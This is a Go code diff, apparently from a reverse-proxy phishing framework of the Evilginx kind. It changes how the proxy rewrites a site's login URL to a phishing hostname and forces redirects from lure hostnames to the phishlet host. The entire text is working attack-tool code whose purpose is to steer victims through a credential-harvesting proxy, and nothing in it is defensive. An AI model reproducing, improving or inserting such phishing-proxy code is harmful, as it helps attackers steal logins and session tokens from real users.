@@ -782,12 +782,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						rurl := pl.GetLoginUrl()
 						u, err := url.Parse(rurl)
 						if err == nil {
-							if strings.EqualFold(req_path, u.Path) == false {
-								// rewrite original hostname to phishing hostname
-								if phish_host, ok := p.replaceHostWithPhished(u.Host); ok {
-									u.Host = phish_host
-									rurl = u.String()
-								}
+							// rewrite original hostname to phishing hostname
+							phish_host, phish_ok := p.replaceHostWithPhished(u.Host)
+							if phish_ok {
+								u.Host = phish_host
+								rurl = u.String()
+							}
+
+							// redirect if path differs OR if we're on a lure hostname
+							// (lure hostname needs redirect even when path matches, to switch to the phishlet host)
+							need_redirect := !strings.EqualFold(req_path, u.Path)
+							if !need_redirect && phish_ok && !strings.EqualFold(req.Host, phish_host) {
+								need_redirect = true
+							}
+
+							if need_redirect {
 								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 								if resp != nil {
 									resp.Header.Add("Location", rurl)
